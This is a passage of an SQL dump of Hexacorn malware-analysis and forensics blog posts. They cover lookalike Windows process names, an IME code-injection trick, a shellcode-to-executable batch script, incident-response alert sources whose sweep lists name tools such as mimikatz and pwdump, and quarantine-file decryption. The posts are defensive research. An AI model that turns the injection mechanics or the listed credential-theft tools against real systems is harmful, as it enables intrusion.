firefox\n5irefox\nf1ref0x\nfire10fox\nfiref0x\nfirefly\nfirefo\nfirefox_\nfirefox2\nfirefox32\nfirefoxe\nfirefoxx\nfirfox\nirefox\nrefox\nwireox\njava.exe\njav3\njava32\njavaa\njavaaa\njavaap\njavac\njavacp\njavag\njavaii\njavapw\njavar\njavare\njavas\njavas5\njavasc\njavase\njavaup\njavavm\njavaw\njavaws\njavawz\njavax\njavo\njavz\nlsass.exe\n1sass\niass\nisaas\nisas\nisass\nissass\nlaass\nlamss\nlarss\nlass\nlassa\nlasse\nlasss\nlcass\nleass\nlhssass\nlrass\nlrsss\nlsa32\nlsac\nlsacs\nlsaess\nlsaoss\nlsas\nlsasa\nlsasas\nlsascs\nlsase\nlsasi\nlsasm\nlsaso\nlsasrv\nlsass3\nlsass32\nlsass47\nlsassi\nlsassn\nlsasss\nlsassv\nlsassx\nlsassys\nlsats\nlsmass\nlsrss\nlssas\nlssass\nmsass\nnsrss\nsalss\nsvchost.exe\n_sachost\n_svch0st\n_svchost\n00svchost\n0svchost\nachost\nchost\ncvhost\ncvshost\nisvchosty\nlsvchost\nmscchost\nmsvchost\nntsvchost\nrdchost\ns_host\nsach0st\nsachost\nsachostc\nsachostp\nsachostp\nsachosts\nsachosts\nsachostw\nsachostw\nsachostx\nsathost\nsbhost\nscanost\nscchost\nscchost\nscchost2\nscchostc\nscchostc\nscghost\nschost\nschost\nschostc\nschosts\nschovst\nschvost\nscvchost\nscvchusts\nscvh0st\nscvh0st\nscvhost\nscvhost\nscvhosv\nscvost\nscvvhost\nsdchost\nsdhost\nserhost\nservehost\nsethost\nsevchos\nsevhost\nshchost\nshhost\nshost\nshvchost\nshvhost\nsichost\nslchost\nslihost\nsmsvchost\nsnahost\nsnhost\nsnphost\nsnvhost\nsochost\nsochvst\nsoohost\nspchost\nsqlhost\nsrchost\nsrshost\nsrvchost\nsrvchost\nsrvhost\nsschost\nsshost\nssvch0st\nssvchost\nssvchost\nssvichosst\nst#host\nstdhost\nsuchost\nsuchost\nsuchostp\nsuchostp\nsuchosts\nsuchosts\nsv_host\nsv±hest\nsv0hoat\nsv1host\nsvahost\nsvahost\nsvcbost\nsvcchost\nsvcchost\nsvcehost\nsvcehost\nsvcgest\nsvcgh0st\nsvcgoost\nsvch0sat\nsvch0sbt\nsvch0set\nsvch0sft\nsvch0slt\nsvch0smt\nsvch0st\nsvch0st\nsvch0st_\nsvch0sts\nsvch7t\nsvchaot\nsvchast\nsvchast\nsvchcst\nsvchcst\nsvchest\nsvchest\nsvchhost\nsvchîst\nsvchkost\nsvcho\nsvchobst\nsvchoct\nsvcholts\nsvchon32\nsvchoost\nsvchoot\nsvchort\nsvchos\nsvchos12\nsvchosd\nsvchosf\nsvchosf\nsvchosi\nsvchosl\nsvchoso\nsvchosr\nsvchoss\nsvchosst\nsvchost\nsvchost\nsvchöst\nsvchost_\nsvchost_cz\nsvchost”\nsvchost0\nsvchost1\nsvchost10\nsvchost16\nsvchost2\nsvchost2\nsvchost3\nsvchost3\nsvchost31\nsvchost32\nsvchost32\nsvchost4\nsvchost5\nsvchost6\nsvchost64\nsvchost64\nsvchosta\nsvchostbb\nsvchostbd\nsvchostbn\nsvchostc\nsvchostc32\nsvchostcx\nsvchostd\nsvchostdll\nsvchoste\nsvchosted\nsvchosti\nsvchosting\nsvchostit\nsvchostl\nsvchostms\nsvchosto\nsvchostr\nsvchostre\nsvchosts\nsvchosts\nsvchosts32\nsvchostsr\nsvchostss\nsvchostt\nsvchostt\nsvchostþ\nsvchostun\nsvchostv\nsvchostv\nsvchostxi\nsvchostxi\nsvchostxxx\nsvchostz\nsvchosv\nsvchosy\nsvchot\nsvchoto\nsvchots\nsvchots\nsvchott\nsvchowb\nsvchowt\nsvchoxt\nsvchoxt\nsvchpst\nsvchpst\nsvchqs\nsvchqst\nsvchs0t\nsvchsot\nsvchsot\nsvchsst\nsvchssts\nsvchst\nsvchste\nsvchsts\nsvchtst\nsvchust\nsvchusts\nsvcinit\nsvcjhost\nsvclost\nsvcmost\nsvcnost\nsvcnost\nsvcohst\nsvcomst\nsvcoost\nsvcost\nsvcpos\nsvcroot\nsvcroot\nsvcshtost\nsvcsoft\nsvcsost\nsvcst\nsvctos\nsvcxhost\nsvdhost\nsvdhost\nsvdnost\nsvehost\nsvehost\nsvgchost\nsvggost\nsvghost\nsvghost\nsvghosts\nsvh0st\nsvhcost\nsvhest\nsvhoct\nsvhosit\nsvhosr\nsvhosst\nsvhost\nsvhost\nsvhost1\nsvhost2\nsvhostc\nsvhoste\nsvhostr\nsvhosts\nsvhostt\nsvhostu\nsvhot\nsvhst\nsvhust\nsvichosst\nsvichost\nsvlhost\nsvnchost\nsvnhost\nsvohcst\nsvohcst\nsvohost\nsvohost\nsvohst\nsvost\nsvphost\nsvphost\nsvphostu\nsvphostu\nsvrhost\nsvrhost\nsvschost\nsvschost\nsvschosta\nsvsh0st\nsvsh0st\nsvshoct\nsvshost\nsvshost\nsvshosti\nsvshosts\nsvshot\nsvuhost\nsvvchcst\nsvvchost\nsvvghost\nsvvhost\nsvvhost\nsvvhosti\nsvwhost\nsvxhos\nsvxhost\nswchost\nswchost\nswdhost\nswhost\nswhost\nsxhost\nsxhost\nsychost\nsynchost\nsynchost\nsynhost\nsyschost\nsyschost\nsyshost\nsyshost\nszchostc\nszchostc\ntsvchost\nusvchost\nuvchost\nvcchost\nvchost\nvhchost\nvhost\nvschost\nvshost\nvsschost\nvxhost\nwsvchost\nwvchosd\nxvshost\nzvchost\nwin.exe (and similar/related names)\nmswin\nwin_\nwin_5\nwin00\nwin01\nwin07\nwin08\nwin09\nwin1\nwin10\nwin11\nwin16\nwin2\nwin22\nwin23\nwin3\nwin30\nwin32\nwin39\nwin4\nwin42\nwin44\nwin45\nwin5\nwin54\nwin55\nwin62\nwin64\nwin7\nwin76\nwin77\nwin8\nwin91\nwin96\nwin98\nwin9x\nwina\nwinad\nwinar\nwinav\nwinb\nwinc\nwince\nwind\nwind3\nwindf\nwindm\nwinds\nwine\nwinet\nwinex\nwinfc\nwingb\nwings\nwingt\nwinhd\nwinhv\nwini\nwinit\nwink\nwinkl\nwinl\nwinlc\nwinma\nwinmm\nwinmn\nwinmx\nwinn\nwinn1\nwinns\nwinnt\nwinny\nwinog\nwinok\nwinos\nwinow\nwinp9\nwinpc\nwinr\nwinra\nwinrm\nwinrr\nwins\nwins7\nwinsh\nwinsp\nwinss\nwinst\nwint\nwinu\nwinud\nwinup\nwinvc\nwinvr\nwinw\nwinwl\nwinwn\nwinws\nwinx\nwinxp\nwinxv\nwinz\nwinlogon.exe\n_winlogon\ninlogon\nnlogon\nwgalogon\nwimlogom\nwin_logn\nwin1ogo\nwin1ogon\nwin1ogons\nwindlogon\nwiniogon\nwinl0g0n\nwinl0gin\nwinl0gon\nwinlgon\nwinligon\nwinlngon\nwinlog\nwinlog056\nwinlog0n\nwinlog1\nwinlogan\nwinloge\nwinlogen\nwinloger\nwinlogin\nwinlogins\nwinlogn\nwinlogo\nwinlogom\nwinlogoms\nwinlogon1\nwinlogon3\nwinlogon32\nwinlogon6\nwinlogon86\nwinlogone\nwinlogonl\nwinlogonn\nwinlogonpc\nwinlogonr\nwinlogons\nwinlogor\nwinlogr\nwinlogs\nwinlogun\nwinlongon\nwinlugan\nwinslogin\nwnilogon\nwnlgon\nwnlogin\nShare this :)', 'Batch Analysis, Clustering, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (194, 'Permanent Link to Updated 3R (RegRipper Ripper)', 'Hexacorn', 'December 17, 2015 ', 'Updated 3R to cover new plug-ins.\nIf you need to quickly build a new RegRipper plug-in you can always try using 3RPG.\nThx To Harlan for continuously adding new plugins (25+ since last time I updated 3R IINW).\nShare this :)', '3R, Forensic Analysis', 'http://www.hexacorn.com/blog/2015/12/17/updated-3r-regripper-ripper/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (195, 'Permanent Link to IME code injection (old)', 'Hexacorn', 'December 17, 2015 ', 'I like clever and unusual tricks that are meant to fool sandboxes or evade malware analysis (and fool researchers). One of the very first one I came across many years ago was a SetWinEventHook trick used by mebroot which was loading the malicious DLL into Windows Explorer. Since then I tried to keep a track of all new tricks since I believe they are one of the most interesting aspects of reverse engineering work + often indicate the sample using the trick may be more interesting than the ‘run off the mill’ malware.\nIn today’s post I will describe a very unusual trick which – while not new – is not very well-known. I came across it in the past while checking my sandbox reports. When I discovered this trick, what caught my attention was the following API sequence:\n\nFindWindowA … Program Manager\nPostMessageA … WM_INPUTLANGCHANGEREQUEST … E0010409\nPostMessageA … WM_INPUTLANGCHANGEREQUEST … 00000409\n\nApparently something was trying to get a window handle of the Program Manager and then force it to change its language input. Any malware looking for the window of Program Manager (shell) or any other shell window and then sending some messages to it immediately triggers alarm in my head, and it was a good catch.\nThe trick is not new and some researchers did mention it in the past – f.ex. here, here, and here, and while the trick was explained by others I still think it is useful to bring it back and describe the clever mechanism behind it.\nThe trick works like this:\n\nThe malware drops a temporary file in a system folder (a copy of itself with a DLL bit set)\nIt then adds a fake keyboard layout E0010409 under the registry key\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\E0010409\n\n\nNotably, it only adds ‘Layout File’ and ‘Layout Text’ entries under this key, skipping the ‘Ime File’ entry (which normally points to the actual IME DLL)\n\n\n\nIt then hooks the NtQueryValueKey and ImmLoadLayout APIs.\nThe first API – NtQueryValueKey – is hooked so that it can provide the necessary value of ‘Ime File’ entry when the ImmLoadLayout API is called (ImmLoadLayout calls RegQueryValueExW which in turn calls NtQueryValueKey)\nThis is a neat trick to avoid writing a suspicious entry (pointing to a malicious / executable file) to Registry and instead, provide the value via a hooked API\n\n\n\nThe second hooked API is ImmLoadLayout\nThe only reason it is hooked seems to be to handle a situation when malware is running with the AV running in a background; the malware doesn’t seem to like 360tray.exe process – if it detects it, it uses the hooked ImmLoadLayout to remove the whole HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts key – it’s a bit strange and this could be a test code – prior to deletion, the malware exports this key to a text file using ‘reg export’\nThe core of the trick is that at some stage the ImmLoadLayout API will be called by the OS from kernel\nAs far as I can tell is it is called via user-mode callback triggered from kernel mode routine ClientImmLoadLayout, which will call KeUserModeCallback with the number 84 (on XP) which in turn will call __ClientImmLoadLayout callback inside user32.dll – this sequence will ensure that the data about the new IME layout is registered inside internal structures of the win32k.sys\nMalware then calls the PostMessageA API with WM_INPUTLANGCHANGEREQUEST and the new keyboard layout E0010409 which forces explorer.exe to call the ImmLoadIME API, which will retrieve the cached information about the malicious IME file via ImmGetImeInfoEx and then call LoadLibraryW (on XP)\nThe whole process doesn’t inject any code into Windows Explorer directly and doesn’t even write a path pointing to the malicious file into Registry\n\nNote: the trick is old, doesn’t work on newer versions of Windows.\nShare this :)', 'Anti-*, Anti-Forensics, Malware Analysis', 'http://www.hexacorn.com/blog/2015/12/17/ime-code-injection-old/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (196, 'Permanent Link to Converting Shellcode to Portable Executable (32- and 64- bit)', 'Hexacorn', 'December 10, 2015 ', 'Analyzing shellcodes is tricky so to simplify this process it’s really handy to convert them into executables which can be then analyzed with a debugger/IDA. Since a shellcode is a position-independent code, all we have to do is to build a simple executable that embeds the shellcode blob, and ensure the entry point of the executable points to the beginning of the embedded code.\nMany people use different tricks to do it, some write C code, or use python.\nBelow, I present probably the simplest and shortest method – using assembly \nThe following is a short tutorial on how to do it with 2 freely available tools – YASM and GoLink:\n\nDownload Yasm\n\nhttp://www.tortall.net/projects/yasm/releases/yasm-1.3.0-win64.exe\nor\nhttp://www.tortall.net/projects/yasm/releases/yasm-1.3.0-win32.exe\n\n\nExtract yasm-1.3.0-win64.exe or yasm-1.3.0-win32.exe and rename it to yasm.exe\nDownload Jeremy Gordon’s GoLink linker\n\nhttp://www.godevtool.com/Golink.zip\n\n\nExtract golink.exe\nName the file storing the extracted shellcode as shellcode.bin\nCreate a shellcode.asm file with the following instructions\n\nGlobal Start\nStart:\nincbin \"shellcode.bin\"\n\nFrom a command line run the following command to assemble the code:\n\nfor 32-bit shellcode\n\nyasm.exe -f win32 -o shellcode.obj shellcode.asm\n\n\nfor 64-bit shellcode\n\nyasm.exe -f win64 -o shellcode.obj shellcode.asm\n\n\n\n\nNow run the linker\n\ngolink /ni /entry Start shellcode.obj\n\n\nThe resulting file shellcode.exe can be debugged or analyzed with IDA\n\nIf it still sounds like a lot of steps, you can create a batch file to do all the work for you. Save it as shell2exe.bat and from now on, all you have to do is to run the following command:\nshell2exe.bat 64 <shellcode file>\nor\nshell2exe.bat 32 <shellcode file>\ndepending on the shellcode architecture.\nHere’s the shell2exe.bat file:\n------------ shell2exe.bat ------------ \r\n@echo off\r\n@if \"%1\"==\"\" goto help\r\n\r\n@echo Global Start > shellcode.asm\r\n@echo SECTION \'foo\' write, execute,read >> shellcode.asm\r\n@echo Start:       >> shellcode.asm\r\n@echo incbin \"%2\"  >> shellcode.asm\r\n@yasm.exe -f win%1 -o shellcode.obj shellcode.asm\r\n@golink /ni /entry Start shellcode.obj\r\n@del shellcode.asm\r\n@del shellcode.obj\r\n@dir shellcode.exe\r\n\r\n@goto exit\r\n\r\n@:help\r\n@echo Converts a shellcode blob to an executable\r\n@echo Required Arguments:\r\n@echo - architecture: 32 or 64 (depending on the shellcode)\r\n@echo - shellcode blob file name\r\n\r\n@:exit\r\necho.\r\n------------ shell2exe.bat ------------\r\n\nAnd we really, really want to keep it supersimple here is the whole package for your convenience. It contains shell2exe.bat + GoLink.exe + 32-bit yasm.exe /for portability/.\nShare this :)', 'Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2015/12/10/converting-shellcode-to-portable-executable-32-and-64-bit/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (197, 'Permanent Link to The comprehensive list of IR sources and alerts (work in progress)', 'Hexacorn', 'December 8, 2015 ', 'Having security controls in place is a win only if we can leverage these controls to deliver alerts to us. Once delivered we can classify them as noise, events, near-misses and incidents, and … take it from there.\nIn today’s post I am making an attempt to create a comprehensive list of alerts that one can retrieve from the various security controls.\nThis is work in progress. If you find something stupid or missing please send comments via email/twitter and I will amend the list. Thanks.\nNote: these are potential sources of alerts; classification, prioritization, severity, etc. is not the scope of this list although I add a lot of examples/hints (all these that are specifically named).\nThis is because:\n\nyou need to know which controls are available first\nthen you need to look at the raw data they collect i.e. take a snapshot and analyze it\nand only then use logic applicable to your organization to determine how to work this huge amount of data\n\nI also do not mention how these alerts need to be set up – whether it is via SIEM, Splunk, manual analysis – it doesn’t matter. Treat is more as a bunch of ideas to cherry-pick from than an ultimate guideline how to secure your org. It’s your job after all \nHere it goes…\n\nAntivirus software\n\nthis is IMHO still one of the most important security controls to look at\nif you don’t handle these as a minimum, you are doing it wrong\nwhat helps is analysis of all threats ever detected by creating a matrix representing threat taxonomy and then defining priorities f.ex.\n\nalerts from C-level, Senior Management, sysadmins, CERT group, internal pentesting team, and other privileged groups\nrootkits, known infostealers, hacking tools, etc.,\nplus alerts from drive C: (indicating infection)\n– all of these are top priority\nPUA/PUP/adware, stuff on removable devices go at the end, but should not be discarded\nyou can create exclusions/filters for eicar, etc.\n\n\ndoing analysis of historical data of AV alerts is very useful; you can immediately spot heavy offenders and try to work with their managers to change the employees’ habits, or business process (f.ex. someone bringing CD/USB from the vendor and sticking it into a production box w/o checking for malware)\nget to know the AV names that your AV vendor uses for threats of primary interest (even though these will often be very inconsistent)\nrecurring infections on the same system\nsame infections on various systems (potential worm, spam campaign/carpet bombing, outbreak of any sort)\nprioritize systems where malware was detected, but not removed, especially on C: drive\ndo not forget that detected and removed malware is not equal eradication; imagine a dropper that drops 2 files – one detected and removed by AV, one unknown piece and happily running on the system\n\n\nEDR software\n\nthis is emerging class of alerts, this pretty much tells you sth is wrong immediately\n\n\nOther HIPS software\nWhitelisting software\nData loss prevention software\nDNS requests\n\nlog all of these and keep the history\n\n\nHoneypots\nFIM (File Integrity Monitors) – tools that ensure no unauthorized file is created or executed on the system (f.ex. Bit9, Solidcore)\nNetwork Intrusion Detection systems\n\n‘First Time Seen’ logic bubbles uncommon events up (any signature seen in the previous day but not seen for the n days prior)\n\n\nFirewall logs\nDHCP logs\nUnix logs\n\nsyslog\nauth\n…\n\n\nProxy logs\n\nsince this is a huge amount of data, review categorization used by vendors; look at all malicious, suspicious traffic\ndo not forget questionable traffic f.ex. porn, warez sites, access to public proxies that may indicate the user wants to bypass controls, etc.\nalso include access to web sites that provide code snippets and programming modules; this is a tough one, especially in a development environment and with ‘stack overflow’ effect where people download and execute quite blindly lots of snippets of code\ntraffic related to IMs; many ppl install unapproved IM clients\nTor traffic\npay special attention to (often abused) dynamic dns domains (find or build a list; it will never be complete, but it will be worthwhile)\npay special attention to “uncategorized” sites if your vendor offers categorization\nproxy-bypass traffic f.ex. glype\n\n\nWeb Application Firewall (WAF) logs\nContent Filtering software\nServer logs\n\nFrom various servers\n\nIIS\nApache\nNginx\n\n\nServer Web Requests\n\ncan prioritize file uploads, keywords detected in queries, unusual IPs\ncan whitelist internal pentesting teams boxes, known external vulnerability scanners [external vendors running scans on your systems]\n\n\n\n\nClient Web Requests [mainly browser requests, but can be also self-updates, etc.]\n\nGET on .exe files (it may sound overwhelming at first, but worth at least analysing it)\nGET on all archive file types (f.ex. zip, rar, 7z, tar.gz, bzip2, etc.)\nGET on .pdf files\nGET on .swf files\nGET on .jar files\nGET on .class files\nLarge POST requests (suggesting uploads/exfiltration)\nLong duration POST requests\nLarge number of requests to the same address\nFrequent POST requests (f.ex. 1/hour) to the same address\nRequests that end up with HTTP errors (these may help to find new drive-by patterns, phishing campaigns)\nUnusual User Agents\nAccess to file hosting portals\n\nDropbox\nBox\nGoogle Drive\nOneDrive\nInternal / External solutions for sharing data with customers/internally\n…\n\n\nAccess to sensitive systems\n\nHR\nPayroll\nDatabases\nBackups\n…\n\n\n\n\nBusiness-specific systems\n\nTicketing systems\nSystems within the scope of PCI DSS\nSystems processing regular data dump exchanges (f.ex. between client and vendor, conversion of data between two different database systems, etc.)\n…\n\n\nLogs from Custom applications\n\nMay require enabling of logging/debug logs\n\n\nSuccessful and unsuccessful logon attempts from any system offering logs really\n\nSSH\nVPN\n(S)FTP\nRemote access tools\n\nRDP\npcAnywhere\nLogMeIn\ngotomypc\nTeamViewer\nvnc (including various clones)\n\n\nDatabases\n\nMSSQL\nOracle\netc.\n\n\nOutlook Web Access\nEmployee Support Pages\n\n\nEmail server\n\nEmails with subjects including commonly used social engineering keywords\n\ndhl\nfedex\npaypal\n…\n\n\nAll URLs extracted from emails\nPotentially other metadata\n\n\nDomain Controllers/Windows Event Logs\n\nAppLocker logs (in a comment I received the adviser suggested that it is even better malware detector than AV – provided it is configured properly)\nCreation of user accounts\nAdding systems to the domain\nCreation of services associated with remote execution\n\npsexec (psexesvc.exe)\n\n\nCreation of all services (analysis may help to whitelist most)\nExecution of programs (requires sysmon installed)\nSuccessful and Unsuccessful Logons\n\n\nPhysical controls\n\nany access controls (proximity cards, etc.)\n\n\nSystems used for issuing security tokens\nLocal wi-fi access points\nMobile phones\nOther security controls and asset inventory tools\n\nSCCM\n\nRegular ‘sweeps’ for presence of\n\nsingle-character and two-character executable file names (p.exe, cc.exe, etc.)\nexecutable files including keywords:\n\ncrack\nwarez\nkeygen\nhack\nporn\n…\n\n\nTor\n\ntor.exe\nvidalia.exe\n\n\nPortable applications\n\ntypically used to bypass/hide installation\n\n\nCommonly used command line versions of archivers\n\nrar.exe\n7z.exe\npkzip.exe\nwinrar.exe\n\n\nCommonly used tools for hacking\n\nnmap.exe\npsexec.exe\nmimikatz.exe\npwdump.exe\n\n\nP2P applications\n\nutorrent.exe\n\n\n\n\n\n\nLanDesk instances\n\n\n\nThank you to everyone who helped to expand this list. Much appreciated!!!\nShare this :)', 'Compromise Detection, Incident Response', 'http://www.hexacorn.com/blog/2015/12/08/the-comprehensive-list-of-ir-sources-and-alerts-work-in-progress/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (198, 'Permanent Link to Why PUA/PUP are bad for you a.k.a. the evil of environment fingerprinting', 'Hexacorn', 'November 9, 2015 ', 'In my post about sample targeting EDR I mentioned that the sample is a PUA/PUP. Looking at the code of many PUA/PUP/adware samples created in last few years it’s easy to see how far they go nowadays in fingerprinting the environments.\nThis is why many of them should be treated as malware & should not be ignored in ‘business as usual’ IR activities.\nIn the aforementioned post I listed a couple of routine names that that particular sample used. All these routines are called one by one, and a final string is generated containing reference numbers associated with each ‘discovered’ piece in the environment.\nThis is no longer just a sandbox detection.\nEDR, VPN, AV, security tools, often list of updates, hotfixes, full software list from registry, etc. is added too. Someone, somewhere populates some large databases with a lot of this ‘goodness’.\nOne can imagine that this data may be a very valuable piece of information – it could be sold not only to advertisers, software writers, even companies whose products are being profiled (competition/market research), but also – of course – on a darker side – to random malware authors, and guys specializing in targeted attacks. If you think of it, a good PUP/PUA campaign could be even orchestrated by the actual BAD guys.\nIf 0days allow a way in, a database with an information about used software may simplify and speed up a lateral movement. And why bother doing all the time-consuming illegal hacking/malware infestation/recon if you can simply deploy borderline software first. Let it populate a huge matrix including lots of information about as many hosts as possible in as many organizations as possible. And then, with such precise information about installed software & deployed countermeasures it can be leveraged to simplify many hacking operations (and targeting).\nThis is of course scaremongering on my side and a conspiracy theory in the making, but the only reason I am writing this is that if you are ever looking for arguments to treat PUA/PUP as malware… or someone argues that PUA/PUP can be ignored in your AV alerts then the massive fingerprinting they do nowadays is the big one…\nShare this :)', 'Compromise Detection, Incident Response, Preaching', 'http://www.hexacorn.com/blog/2015/11/09/why-puapup-are-bad-for-you-a-k-a-the-evil-of-environment-fingerprinting/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (199, 'Permanent Link to Decrypting MalwareBytes .quar files', 'Hexacorn', 'November 8, 2015 ', 'A few years ago I developed script to decrypt .quar files created by MalwareBytes. Since the decryption routine was different from a typical xor I was not sure how the MalwareBytes will react – I asked them for a permission to release the code publicly for the benefit of the DFIR/RCE community, but unfortunately, they refused at that time.\nSince I posted info about my script on one of the DFIR forums I have been asked many times by many researchers to share the script with them privately.\nToday I noticed that the cat is out of the bag and the code for decrypting .quar files was already made public by someone else here.\nThe script is actually covering many other quarantine files as well which is awesome.\nGreat work by the Optiv guys.\nLet’s hope that code for all types of Quarantine files will eventually be made public.\nUpdate\nSince some people asked, here is a short perl script for decrypting .quar files:\nuse strict;\r\nuse warnings;\r\nuse Crypt::RC4;\r\nuse Digest::MD5 qw (md5 );\r\n\r\nmy $f=shift || die (\"Gimme a file name!\\n\");\r\nopen F,\"<$f\";\r\nbinmode F;\r\nread F,my $data,-s $f;\r\nclose F;\r\n\r\nmy $rc4 = Crypt::RC4->new( md5 (\'XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\') );\r\nmy $newdata = $rc4->RC4( $data );\r\n\r\nopen F,\">$f.out\";\r\nbinmode F;\r\nprint F $newdata;\r\nclose F;\nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (200, 'Permanent Link to AntiEDR – Samples targeting EDR (Endpoint Detection and Response) solutions', 'Hexacorn', 'November 7, 2015 ', 'I have recently came across an non-intriguing intriguing sample belonging to a family of applications commonly known as a PUA/PUP (Potentially Unwanted Application/Program). The ‘intriguing’ part is that it is the first one I have ever came across that actively tries to detect an EDR solution installed on the system, and in this particular case – CarbonBlack.\nThe sample md5 is 1233411098A5EE69EB925C559B815510.\nWhat caught my attention was a string ‘IsRunningCarbon’ that I came across when i was eyeballing some of the logs generated by my batch analysis script.\nIt was placed among many other interesting strings f.ex.:\n\nIsTestingBox\nIsVirtualMachine\nHasVirtualDrive\nIsRunningOnVMWare\nIsRunningOnHyperV\nIsRunningOnVBox\nIsRunningOnXEN\nIsRunningVPN\nIsRunningIPSECLP2\nIsRunningOpenVPN\nIsRunningPPTP\nIsRunningTools\nIsRunningFiddler\nIsRunningFiddlerCert\nIsRunningDeepFreeze\nIsRunningPacketCapture\nIsRunningAVs\nIsRunningESET\nIsRunningVipre\nIsRunningCarbon\nIsFlashInstalled\n\nso it looked like a part of a generic ‘sandbox/monitor/security product detection’ pack of routines.\nWhen loaded into ILSPY, the code of the function referenced by the name turned out to be a simple ‘directory present’ check (if the ‘CarbonBlack’ directory exists in a predetermined location), but the message the existence of this routine in the code sends to the EDR vendors is that they start to be recognized.\nPerhaps it’s not a big deal, but certainly notable. Maybe it is time to introduce randomization in the way EDR-specific directories are named? Or hide them completely (rootkit)?\nOf course, the detection of EDR was always possible, but since now it is being actively done I bet it’s just a matter of time when we will see first evasions…\nShare this :)', 'Anti-*, Anti-Forensics, Batch Analysis, Compromise Detection, Forensic Analysis, Incident Response, ', 'http://www.hexacorn.com/blog/2015/11/07/antiedr-samples-targeting-edr-endpoint-detection-and-response-solutions/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (201, 'Permanent Link to Java and .oracle_jre_usage folder', 'Hexacorn', 'November 5, 2015 ', 'Today I installed the latest version of Java SDK (8.0.660.17) for testing purposes. After the installation on the good ol’ XP I noticed that it created a folder named %userprofile%\\.oracle_jre_usage. This looked interesting so I googled for it. Turns out lots of people spotted it in earlier version of Java and someone on Oracle forum even provides a good explanation as to what Java component it is from:\nThat is the default location for the Java Usage Tracker. See the Oracle docs\nhttps://docs.oracle.com/javacomponents/usage-tracker/overview/\nSince the folder is created even if the Usage tracker is disabled, we can leverage it as a yet-another-minor timeline-related artifact that can be potentially useful for cherry-picking two Java-related timestamps:\n\nwhen Java was installed (more or less, see below)\nwhen was the last time java.exe was launched (most likely to execute an application; I have not tested JRE & applets yet)\n\nThe folder ‘%userprofile%\\.oracle_jre_usage’ is created during Java installation:\n\nso you should find at least one randomly named file in this folder. In my case it was:\n\n90737d32e3aba4b.timestamp\n\nInspecting its content shows a path leading to Java JRE and a timestamp in a format that appears to be a Unix timestamp with microseconds:\n\ngives us 1446745410996 which roughly translates to 2015-10-05 09:43:30:996  – somewhere in-between the logs shown in Procmon output (could be a discrepancy between the time of retrieving of the timestamp and time of actually writing it to a file).\nRunning actual Java program causes the java.exe to look for ‘f9b9f6b8ff8b2b60.timestamp’ (refer to Procmon screenshot above) – this is randomly named file as well so if you look at the folder, you should see 2 of them.\nIf not found it’s created and its content is similar to ‘90737d32e3aba4b.timestamp’: the path and the Unix stamp.\nThe following screenshot shows how the Unix timestamp is changing anytime we run java.exe to execute a simple HelloWorld Java application (HelloWorld.class):\nTo conclude: nothing ground breaking, but yet another pair of timestamps that may help with the investigation one day…\n \nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2015/11/05/java-and-oracle_jre_usage-folder/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (202, 'Permanent Link to AutoIt3 nested dolls', 'Hexacorn', 'October 29, 2015 ', 'I recently came across a post on Twitter referring to an AutoIt3 sample that apparently could not be decompiled using Exe2Aut and myAuToExe.\nIt triggered my interest.\nIt turns out that the file could be decompiled using Exe2Aut, but it is an AutoIt nested doll and has some mildly interesting anti-reversing features that require a bit more work than usual. Since these AutoIt3 nested dolls are becoming more and more common I describe below the process of breaking these apart and to do so I am using a sample I referred to earlier.\nNote, I do not provide full analysis of the sample and files dropped or loaded inline and am mainly focusing on the AutoIt layers.\nThe sample in question is 597029DCB2738C17BE6D79814CDAF229.\nLoading it into Exe2Aut actually works, but the resulting is a short Autoit3 script which is obfuscated.\n$ee = \"eWEpCwslF\"\r\n$dd = \"OYTdreHl\"\r\n$test = \"FileW\"\r\n$ketbha = \"jZU\"\r\n...\n$n = \"GbVu\"\r\nExecute($test)\n[full decompiled script is here]\nAutoIt is an interpreted language and based on the code above we see that the script we have extracted using Exe2Aut builds another script (a snippet really).\nIn order to get the new script, we can analyze the code manually and figure out the content of the variable $test prior to execution (good luck with that!), or we can cheat and replace Execute statement shown above with a call to a FileWrite function:\nFileWrite (\"var_test\", $test)\nWhen you execute the script like this under AutoIt, you will get the interpreter to write the content of the $test variable to a ‘var_test’ file.\nThe content of the ‘var_test’ file is like this:\nSince the code is a bit messy, we can beautify it a bit:\nWhat happens here is as follows:\n\nA new temporary file is created using a name stored in a variable $ee\nThe content of a new file comes from the original file\nThe content of a newly created file is found inside the original file by locating a marker (the marker is represented by a data stored in a variable $dd)\nThe function StringInStr is being used to find the aforementioned marker\nThe content stored in the original file contains a second marker ‘PLXL1’ which is replaced (before writing) with ‘AU3!EA06’ – replacing ‘PLXL1’ with ‘AU3!EA06’ suggests that the newly created temporary file is in fact a compiled AutoIt script (yet another one)\nFunction StringMid is used to extract the final content\nIn the end, the newly created file is executed using the ShellExecute function\n\nNotably, it is actually executing itself and passing to itself the name of a newly created temporary file as a command line parameter together with the /AutoIt3ExecuteScript argument\nIn case you are not aware of this, AutoIt3 executable files contain an interpreter /as a stub/ followed by the compiled script\nSo, passing arguments to itselfs makes the stub interpreter execute 